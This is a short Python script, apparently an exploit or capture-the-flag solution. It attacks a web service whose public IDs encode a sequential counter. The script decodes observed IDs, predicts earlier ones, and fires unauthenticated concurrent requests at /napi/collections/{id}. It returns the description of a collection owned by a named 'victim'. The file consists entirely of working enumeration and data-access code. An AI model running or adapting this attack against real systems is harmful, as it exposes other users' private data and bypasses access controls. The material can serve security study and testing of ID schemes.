"""
Counter-based ID generation: each public_id encodes a sequential counter.

The id_server increments a counter (0, 1, 2, ...) on each call.
Counter -> 9 bytes (big-endian) -> base64url -> 12 chars -> drop first char -> 11 chars.

The first base64url char (top 6 bits, MSB) is dropped.
For small counters (< 2^66), those bits are zero, so decoding is exact.
"""

import asyncio
import base64
from typing import Sequence, Optional
import httpx

BURST_SIZE = 6
MAX_GAP = 500


def _encode_counter(counter: int) -> str:
    raw = counter.to_bytes(9, "big")
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")[1:12]


def _decode_counter(public_id: str) -> Optional[int]:
    padded = "A" + public_id
    try:
        return int.from_bytes(base64.urlsafe_b64decode(padded), "big")
    except Exception:
        return None


def recover_state(observed: Sequence[str]) -> Optional[int]:
    if len(observed) < 2:
        return None

    counters = []
    for pid in observed:
        c = _decode_counter(pid)
        if c is not None:
            counters.append(c)

    if len(counters) < 2:
        return None

    for i in range(len(counters)):
        for j in range(i + 1, len(counters)):
            diff = counters[j] - counters[i]
            expected_min = (j - i) * 1
            expected_max = (j - i) * MAX_GAP
            if expected_min <= diff <= expected_max:
                return counters[i]
    return None


def generate_public_id(counter: int) -> str:
    return _encode_counter(counter)


async def find_victim_collection(
    conn,
    start_counter: int,
    victim_name: str,
    max_reverse: int = 100,
    batch_size: int = 20,
) -> Optional[str]:
    candidates = [
        _encode_counter(start_counter - k) for k in range(1, max_reverse + 1)
    ]

    sem = asyncio.Semaphore(batch_size)
    timeout = httpx.Timeout(3.0, connect=3.0)

    async def check(pid: str) -> Optional[str]:
        async with sem:
            try:
                r = await conn.get(
                    f"/napi/collections/{pid}",
                    cookies=None,
                    timeout=timeout,
                )
                if r.status_code != 200:
                    return None
                data = r.json()
                if (
                    data.get("user", {}).get("username", "").lower()
                    != victim_name.lower()
                ):
                    return None
                return data.get("description") or ""
            except Exception:
                return None

    for i in range(0, len(candidates), batch_size):
        batch = candidates[i : i + batch_size]
        results = await asyncio.gather(*[check(pid) for pid in batch])
        for desc in results:
            if desc:
                return desc
    return None
